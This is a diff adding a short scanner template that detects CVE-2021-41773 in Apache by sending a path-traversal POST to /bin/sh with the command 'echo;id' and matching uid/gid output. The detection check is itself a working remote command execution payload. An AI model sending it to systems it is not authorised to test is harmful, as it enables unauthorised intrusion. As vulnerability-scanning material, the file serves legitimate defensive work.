@@ -1,0 +1,21 @@
+id: CVE-2021-41773
+
+info:
+  name: Apache RCE detection
+  author: "EBB"
+
+requests:
+  - method: POST
+    path: 
+      - "{{BaseURL}}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+    body: "echo;id"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "uid=.+gid=.+groups=.+"
